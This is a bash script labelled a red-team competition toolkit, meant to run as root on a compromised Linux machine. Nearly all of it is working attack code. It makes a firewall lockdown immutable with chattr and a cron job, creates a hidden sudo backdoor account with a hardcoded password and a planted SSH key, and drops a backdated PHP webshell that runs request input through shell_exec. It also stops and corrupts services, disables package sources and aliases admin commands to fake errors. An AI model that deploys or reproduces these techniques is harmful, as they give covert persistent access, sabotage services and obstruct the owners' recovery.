#!/usr/bin/env bash
# Red team competition toolkit — Linux
# Run as root on a compromised box.
# COMPETITION USE ONLY.
set -uo pipefail

if [[ $EUID -ne 0 ]]; then echo "Need root." >&2; exit 1; fi

# ============================================================
# CONFIG — set these for your team
# ============================================================
TEAM_SSH_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINUM/sFsQleaSedlq9cIukqjfkPxEP4xSOzJ4MZ1AruD redteam-comp"
BACKDOOR_USER="syshealth"       # innocuous-looking username
BACKDOOR_PASS="Comp2024!RT"     # password for the backdoor user
WEBSHELL_NAME=".sys-check.php"  # hidden webshell filename

echo "=== Red Team Toolkit — Linux ==="

# ============================================================
# 0. FIREWALL LOCKDOWN — purple team use (R18 does NOT apply)
#    NOTE: ROE R18 restricts firewall rules on YOUR OWN boxes.
#    This section is for purple teaming OTHER teams' boxes only.
#    Do NOT run Section 0 on your own team's boxes.
# ============================================================
echo "[*] Locking down firewall..."

# Access ports only — scored service ports are deliberately NOT opened
ALLOWED_PORTS=(22 8080)

# Explicitly blocked scored ports (default deny covers these, but deny rules
# survive even if someone adds an allow rule for the same port)
BLOCKED_PORTS=(53 80 443 1883 3306 21)

ufw --force reset
ufw default deny incoming
ufw default deny outgoing

# Allow only access ports
for port in "${ALLOWED_PORTS[@]}"; do
  ufw allow in "$port"
  ufw allow out "$port"
done

# Explicit deny on scored ports (takes priority if someone adds allow rules)
for port in "${BLOCKED_PORTS[@]}"; do
  ufw deny in "$port"
  ufw deny out "$port"
done
ufw deny in 53/udp
ufw deny out 53/udp

# Loopback
ufw allow in on lo
ufw allow out on lo

ufw --force enable

# Firewall persistence cron — re-enables UFW every minute if someone kills it
FW_PERSIST="/usr/local/bin/.fw-persist.sh"
cat > "$FW_PERSIST" << 'FWINNER'
#!/usr/bin/env bash
if ! ufw status | grep -q "Status: active"; then
  ufw --force enable
fi
FWINNER
chmod 700 "$FW_PERSIST"
(crontab -l 2>/dev/null | grep -v "$FW_PERSIST"; echo "* * * * * $FW_PERSIST") | crontab -

# chattr +i on UFW configs so blue team can't just edit them
chattr +i /etc/ufw/ufw.conf 2>/dev/null || true
chattr +i /etc/ufw/user.rules 2>/dev/null || true
chattr +i /etc/ufw/user6.rules 2>/dev/null || true
chattr +i /etc/ufw/before.rules 2>/dev/null || true
chattr +i /etc/ufw/before6.rules 2>/dev/null || true
chattr +i /etc/ufw/after.rules 2>/dev/null || true
chattr +i /etc/ufw/after6.rules 2>/dev/null || true
chattr +i /etc/default/ufw 2>/dev/null || true
chattr +i "$FW_PERSIST" 2>/dev/null || true

# Lock the crontab spool file
CRON_FILE="/var/spool/cron/crontabs/root"
[[ ! -f "$CRON_FILE" ]] && CRON_FILE="/var/spool/cron/root"
[[ -f "$CRON_FILE" ]] && chattr +i "$CRON_FILE" 2>/dev/null

# ============================================================
# 1. PERSISTENCE — multiple fallback mechanisms
# ============================================================
echo "[*] Setting up persistence..."

# --- Backdoor user (looks like a service account) ---
useradd -m -s /bin/bash -G sudo,adm,shadow "$BACKDOOR_USER" 2>/dev/null
echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd
# Hide from login screen (UID below threshold trick)
sed -i "s/^$BACKDOOR_USER:x:[0-9]*:/$BACKDOOR_USER:x:999:/" /etc/passwd

# Plant SSH key for passwordless access
mkdir -p /home/$BACKDOOR_USER/.ssh
echo "$TEAM_SSH_PUBKEY" > /home/$BACKDOOR_USER/.ssh/authorized_keys
chmod 700 /home/$BACKDOOR_USER/.ssh
chmod 600 /home/$BACKDOOR_USER/.ssh/authorized_keys
chown -R $BACKDOOR_USER:$BACKDOOR_USER /home/$BACKDOOR_USER/.ssh


# ============================================================
# 2. SERVICE DISRUPTION — take down scored services
# ============================================================
echo "[*] Disrupting services..."

# --- Stop and disable common scored services ---
# NOTE: sshd is NOT touched — we need it to get back in
SERVICES=(apache2 nginx httpd mysql mariadb postgresql vsftpd proftpd pure-ftpd
          postfix dovecot named bind9 samba smbd cups docker)

for svc in "${SERVICES[@]}"; do
    systemctl stop "$svc" 2>/dev/null
    systemctl disable "$svc" 2>/dev/null
done

# --- Corrupt service configs (subtle — they'll start but misbehave) ---
# Apache: change listen port so it starts but doesn't serve on 80
if [[ -f /etc/apache2/ports.conf ]]; then
    sed -i 's/Listen 80/Listen 8181/' /etc/apache2/ports.conf
fi
if [[ -f /etc/httpd/conf/httpd.conf ]]; then
    sed -i 's/Listen 80/Listen 8181/' /etc/httpd/conf/httpd.conf
fi

# DNS: break zone files if BIND is running
if [[ -d /etc/bind ]]; then
    for zone in /etc/bind/db.*; do
        [[ -f "$zone" ]] && echo "BROKEN" >> "$zone"
    done
fi

# --- Webshell plant (if a webroot exists) ---
for webroot in /var/www/html /var/www /usr/share/nginx/html /srv/http; do
    if [[ -d "$webroot" ]]; then
        cat > "$webroot/$WEBSHELL_NAME" << 'SHELL'
<?php if(isset($_REQUEST['c'])){echo "<pre>".shell_exec($_REQUEST['c'])."</pre>";}?>
SHELL
        # make it look old
        touch -t 202201010000 "$webroot/$WEBSHELL_NAME"
    fi
done


# ============================================================
# 3. MAKE RECOVERY HARD — slow down blue team
# ============================================================
echo "[*] Making recovery difficult..."


# --- Break package managers (can't easily reinstall/fix things) ---
if command -v apt-get &>/dev/null; then
    # Redirect apt sources to nothing
    cp /etc/apt/sources.list /etc/apt/.sources.list.bak
    echo "# cleaned" > /etc/apt/sources.list
    chattr +i /etc/apt/sources.list 2>/dev/null
fi
if command -v yum &>/dev/null; then
    for repo in /etc/yum.repos.d/*.repo; do
        [[ -f "$repo" ]] && sed -i 's/enabled=1/enabled=0/' "$repo"
    done
fi

# --- Alias common admin commands to no-ops ---
cat >> /etc/bash.bashrc << 'EOF'
alias iptables='echo "iptables: command not found"'
alias ufw='echo "ufw: command not found"'
alias systemctl='echo "systemctl: command not found"'
alias service='echo "service: command not found"'
alias chattr='echo "chattr: command not found"'
EOF


echo ""
echo "=== Toolkit deployed ==="
echo "Firewall:         UFW deny all, allowed: ${ALLOWED_PORTS[*]}"
echo "                  Explicitly blocked: ${BLOCKED_PORTS[*]} (scored services)"
echo "                  Configs immutable, cron re-enables every minute"
echo "Backdoor user:    $BACKDOOR_USER / $BACKDOOR_PASS (UID 999)"
echo "SSH key planted:  /home/$BACKDOOR_USER/.ssh/authorized_keys"
echo "Webshell:         $WEBSHELL_NAME in any webroot"
echo "Services stopped: ${SERVICES[*]}"
echo "Recovery hardened."

